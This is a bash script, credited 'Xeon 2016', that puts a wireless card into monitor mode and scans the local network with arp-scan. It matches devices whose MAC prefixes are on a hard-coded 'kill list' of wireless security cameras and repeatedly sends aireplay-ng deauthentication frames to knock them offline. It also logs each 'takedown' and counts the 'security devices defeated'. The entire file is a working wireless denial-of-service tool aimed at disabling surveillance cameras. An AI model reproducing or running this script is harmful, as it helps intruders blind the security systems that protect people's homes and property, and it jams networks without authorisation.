#!/bin/bash
# Xeon 2016
#
# Detect and disconnect wireless security devices.
#
#   sudo ./antisurveillance.sh <optional WIRELESS NETWORK>
#
# This script uses aireplay-ng, airmon-ng and arp-scan
# Install with 'apt-get install aircrack-ng arp-scan'
#
readonly LOG=/var/log/antisurveillance.log
touch $LOG

[ $UID != 0 ] && echo 'Run as root.' && exit 1

shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

readonly NIC=wlan0
[ -z $1 ] &&
readonly ESSID=`iwconfig $NIC 2>/dev/null | grep -o -E '".*"' | sed 's/"//g'` || readonly ESSID=$1 # Network BSSID

echo -n "Grabbing AP BSSID for $ESSID: "

#readonly BSSID=`iw dev $NIC scan | grep -B 10 'SSID: '$ESSID | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
readonly BSSID=`iwconfig $NIC 2>/dev/null | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'` #if connected to network

echo -e "\033[36m"$BSSID"\033[0m"

readonly MAC='30:8c:fb|00:24:e4' # Match
readonly POLL=4 # Check every x seconds

echo -n "Starting monitor mode..."
airmon-ng stop mon0 1>&/dev/null # Pull down any lingering monitor devices
airmon-ng start $NIC 1>&/dev/null # Start a monitor device
echo "done."

while true;
do
    c=0
    for TARGET in $(arp-scan -lqRN -I $NIC | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
        do
           TIME=`date +%H:%M:%S`
           if [[ $TARGET =~ (^| )$MAC($| ) ]]
               then
                   play -n synth sine 880 sine 330 remix 1-2 fade 0 0.25 1>&/dev/null
                   echo -e $TIME"  \033[31m[ALERT]\033[0m Wireless security device discovered: \033[36m"$TARGET"\033[0m"
                   echo $TIME "  Device found: "$TARGET >> $LOG

                   aireplay-ng --ignore-negative-one -0 1 -e $ESSID -a $BSSID -c $TARGET mon0 &&

                   echo -e $TIME"  De-authed: \033[36m"$TARGET"\033[0m from network: \033[36m"$BSSID"\033[0m ($ESSID)" &&
                   echo $TIME"  Sent de-auth packets to "$TARGET>> $LOG
                   echo -n $TIME"  Confirming takedown..."

                   sleep 0.2 # wait for deauth, latancy...
                   ping -c 1 -I $NIC -W 1 `arp -i $NIC -n | grep $TARGET | awk '{print $1}'` 1>/dev/null 2>&1 &&

                   echo -e "\033[31mfailed!\033[0m" || echo -e "\033[32msuccessful!\033[0m" && c=$(($c+1)) &&
                   play -n synth sine 880 sine 660 remix 1-2 fade 0 0.25 1>&/dev/null
                else
                   echo -e $TIME"  Device is not on kill list, ignoring device: \033[36m"$TARGET"\033[0m"
           fi
       done
       echo -e "Security devices defeated: [$c] Sleeping...\n"
       sleep $POLL
done
airmon-ng stop mon0
exit 0
